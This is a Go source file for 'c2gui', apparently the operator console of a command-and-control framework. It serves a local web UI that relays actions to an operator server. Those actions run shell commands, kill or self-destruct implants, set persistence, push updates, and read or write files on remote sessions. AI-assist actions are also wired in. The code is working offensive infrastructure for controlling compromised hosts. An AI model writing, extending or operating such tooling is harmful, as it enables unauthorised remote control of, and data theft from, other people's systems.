// Command c2gui is the operator GUI.
//
// It is a single self-contained Go binary: it serves an embedded HTML/JS UI on
// 127.0.0.1 and bridges it to the operator protocol (TLS/WSS).  There is no
// Electron, no JRE and no .NET runtime dependency; the browser is only the
// rendering surface and never talks to the server directly.
//
// Usage:
//
//	c2gui -url wss://oprand.example.com/ws -user operator -key <b64psk> [-addr 127.0.0.1:8787] [-open]
//	c2gui -selftest
//
// Panels: sessions, terminal, file transfer, build profiles, module browser,
// audit chain, multi-operator presence.  Destructive actions (shell, kill,
// module-run, update publish) require an explicit confirmation the UI forwards
// as the X-C2-Confirm header, and every action is audited server-side.
package main

import (
	"context"
	"embed"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"c2v2/internal/operator"
)

//go:embed web/index.html
var webFS embed.FS

// Bridge is the subset of the operator client the GUI needs.  Tests inject a
// fake bridge so the HTTP layer can be verified without a live server.
type Bridge interface {
	Call(ctx context.Context, cmd string, args map[string]any) (json.RawMessage, error)
	Close() error
}

type liveBridge struct{ c *operator.Client }

func (b *liveBridge) Call(ctx context.Context, cmd string, args map[string]any) (json.RawMessage, error) {
	return b.c.Call(ctx, cmd, args)
}
func (b *liveBridge) Close() error { return b.c.Close() }

// destructive lists actions that require the X-C2-Confirm header.
var destructive = map[string]bool{
	"shell": true, "run": true, "module-run": true, "kill": true,
	"selfdestruct": true, "update-publish": true, "update-approve": true,
	"update-rollback": true, "file-put": true, "persist": true,
}

var allowed = map[string]bool{
	"list": true, "stats": true, "tasks": true, "modules": true, "module-search": true,
	"module-show": true, "module-run": true, "run": true, "shell": true, "kill": true,
	"audit": true, "verify-audit": true, "use": true, "release": true, "locks": true,
	"update-publish": true, "update-push": true, "update-approve": true, "update-pin": true,
	"update-rollback": true, "update-list": true, "ai-status": true, "ai-tools": true, "ai-ask": true,
	"fs_cat": true, "file-put": true, "presence": true,
}

type gui struct {
	b   Bridge
	log *log.Logger
}

func (g *gui) routes() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/", g.index)
	mux.HandleFunc("/api/state", g.state)
	mux.HandleFunc("/api/cmd", g.cmd)
	mux.HandleFunc("/api/file", g.file)
	return mux
}

func (g *gui) index(w http.ResponseWriter, r *http.Request) {
	data, err := webFS.ReadFile("web/index.html")
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	_, _ = w.Write(data)
}

func (g *gui) state(w http.ResponseWriter, r *http.Request) {
	ctx, cancel := context.WithTimeout(r.Context(), 15*time.Second)
	defer cancel()
	out := map[string]any{}
	if raw, err := g.b.Call(ctx, "list", map[string]any{}); err == nil {
		out["sessions"] = raw
	} else {
		out["sessions_error"] = err.Error()
	}
	if raw, err := g.b.Call(ctx, "modules", map[string]any{}); err == nil {
		out["modules"] = raw
	}
	if raw, err := g.b.Call(ctx, "audit", map[string]any{"limit": 40}); err == nil {
		out["audit"] = raw
	}
	if raw, err := g.b.Call(ctx, "ai-status", map[string]any{}); err == nil {
		out["ai"] = raw
	}
	if raw, err := g.b.Call(ctx, "update-list", map[string]any{}); err == nil {
		out["updates"] = raw
	}
	writeJSON(w, 200, out)
}

func (g *gui) cmd(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, 405, map[string]string{"error": "POST only"})
		return
	}
	var body struct {
		Action string         `json:"action"`
		Args   map[string]any `json:"args"`
	}
	if err := json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(&body); err != nil {
		writeJSON(w, 400, map[string]string{"error": "bad json: " + err.Error()})
		return
	}
	if !allowed[body.Action] {
		writeJSON(w, 400, map[string]string{"error": "action not allowed: " + body.Action})
		return
	}
	if destructive[body.Action] && r.Header.Get("X-C2-Confirm") != "yes" {
		writeJSON(w, 428, map[string]string{"error": "confirmation required", "action": body.Action})
		return
	}
	if body.Action == "file-put" {
		// file-put is only reachable through /api/file
		writeJSON(w, 400, map[string]string{"error": "use /api/file for uploads"})
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 120*time.Second)
	defer cancel()
	raw, err := g.b.Call(ctx, body.Action, body.Args)
	if err != nil {
		g.log.Printf("cmd %s failed: %v", body.Action, err)
		writeJSON(w, 502, map[string]string{"error": err.Error()})
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_, _ = w.Write(raw)
}

func (g *gui) file(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		sid, path := r.URL.Query().Get("sid"), r.URL.Query().Get("path")
		if sid == "" || path == "" {
			writeJSON(w, 400, map[string]string{"error": "sid and path are required"})
			return
		}
		ctx, cancel := context.WithTimeout(r.Context(), 120*time.Second)
		defer cancel()
		raw, err := g.b.Call(ctx, "run", map[string]any{"name": "fs_cat", "sid": sid,
			"args": map[string]any{"path": path, "max": 1 << 20}})
		if err != nil {
			writeJSON(w, 502, map[string]string{"error": err.Error()})
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write(raw)
	case http.MethodPost:
		if r.Header.Get("X-C2-Confirm") != "yes" {
			writeJSON(w, 428, map[string]string{"error": "confirmation required"})
			return
		}
		var body struct {
			SID  string `json:"sid"`
			Path string `json:"path"`
			B64  string `json:"b64"`
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 16<<20)).Decode(&body); err != nil {
			writeJSON(w, 400, map[string]string{"error": err.Error()})
			return
		}
		if body.SID == "" || body.Path == "" {
			writeJSON(w, 400, map[string]string{"error": "sid and path are required"})
			return
		}
		ctx, cancel := context.WithTimeout(r.Context(), 120*time.Second)
		defer cancel()
		raw, err := g.b.Call(ctx, "run", map[string]any{"name": "fs_put", "sid": body.SID,
			"args": map[string]any{"path": body.Path, "data": body.B64}})
		if err != nil {
			writeJSON(w, 502, map[string]string{"error": err.Error()})
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write(raw)
	default:
		writeJSON(w, 405, map[string]string{"error": "GET or POST only"})
	}
}

func writeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}

func main() {
	url := flag.String("url", os.Getenv("C2_OPERATOR_URL"), "operator endpoint, e.g. wss://oprand.example.com/ws")
	user := flag.String("user", os.Getenv("C2_OPERATOR_USER"), "operator user")
	keyB64 := flag.String("key", os.Getenv("C2_OPERATOR_KEY"), "operator PSK (base64)")
	addr := flag.String("addr", "127.0.0.1:8787", "local listen address")
	insecure := flag.Bool("insecure", false, "skip TLS verification (lab only)")
	openBrowser := flag.Bool("open", false, "open the default browser")
	selftest := flag.Bool("selftest", false, "run an offline self-test and exit")
	flag.Parse()
	logger := log.New(os.Stderr, "[c2gui] ", log.LstdFlags)

	if *selftest {
		if err := selfTest(); err != nil {
			logger.Fatalf("selftest failed: %v", err)
		}
		fmt.Println("c2gui selftest: OK")
		return
	}
	if *url == "" || *user == "" || *keyB64 == "" {
		logger.Fatalf("missing connection settings: -url, -user and -key (or C2_OPERATOR_* env) are required")
	}
	key, err := decodeKey(*keyB64)
	if err != nil {
		logger.Fatalf("key: %v", err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	oc, err := operator.Dial(ctx, *url, operator.Options{User: *user, Key: key, Insecure: *insecure, Timeout: 15 * time.Second})
	cancel()
	if err != nil {
		logger.Fatalf("operator connect: %v", err)
	}
	g := &gui{b: &liveBridge{c: oc}, log: logger}
	ln, err := net.Listen("tcp", *addr)
	if err != nil {
		logger.Fatalf("listen: %v", err)
	}
	real := ln.Addr().String()
	logger.Printf("GUI listening on http://%s (operator=%s user=%s)", real, *url, *user)
	if *openBrowser {
		openURL("http://" + real + "/")
	}
	srv := &http.Server{Handler: g.routes(), ReadHeaderTimeout: 10 * time.Second}
	if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
		logger.Fatalf("serve: %v", err)
	}
}

func decodeKey(s string) ([]byte, error) {
	return decodeB64(s)
}

func openURL(u string) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", u)
	case "darwin":
		cmd = exec.Command("open", u)
	default:
		cmd = exec.Command("xdg-open", u)
	}
	_ = cmd.Start()
}

// selfTest exercises the HTTP layer with a stub bridge: no network at all.
func selfTest() error {
	g := &gui{b: stubBridge{}, log: log.New(os.Stderr, "[selftest] ", 0)}
	ts := newTestServer(g.routes())
	defer ts.Close()
	body, err := httpGet(ts.URL + "/")
	if err != nil || !strings.Contains(body, "C2V2") {
		return fmt.Errorf("index not served: %v", err)
	}
	state, err := httpGet(ts.URL + "/api/state")
	if err != nil || !strings.Contains(state, "sessions") {
		return fmt.Errorf("state: %v %s", err, state)
	}
	// destructive without confirm must be refused
	code, _ := httpPost(ts.URL+"/api/cmd", `{"action":"shell","args":{}}`, "")
	if code != 428 {
		return fmt.Errorf("destructive action not blocked (%d)", code)
	}
	code, resp := httpPost(ts.URL+"/api/cmd", `{"action":"shell","args":{"sid":"s1","cmd":"whoami"}}`, "yes")
	if code != 200 || !strings.Contains(resp, "stub") {
		return fmt.Errorf("confirmed action failed: %d %s", code, resp)
	}
	code, _ = httpPost(ts.URL+"/api/cmd", `{"action":"evil","args":{}}`, "yes")
	if code != 400 {
		return fmt.Errorf("unknown action not rejected (%d)", code)
	}
	return nil
}



var buildVersion = "dev"


